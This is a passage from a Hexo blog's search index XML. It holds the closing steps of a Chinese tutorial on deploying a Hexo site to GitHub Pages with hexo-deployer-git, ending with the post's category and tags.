class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch] #published</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><p>安装 hexo-deployer-git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save   #第一次部署需要先安装插件</span><br></pre></td></tr></table></figure><p><strong>部署</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d(deploy) #部署到网站</span><br></pre></td></tr></table></figure><p>接下来可以访问我们的GitHub pages页面，查看效果啦</p><h3 id="5-最后"><a href="#5-最后" class="headerlink" title="5. 最后"></a>5. 最后</h3><p>关于hexo的最新详细配置，可以参考[hexo官方文档]:<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> 博客 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
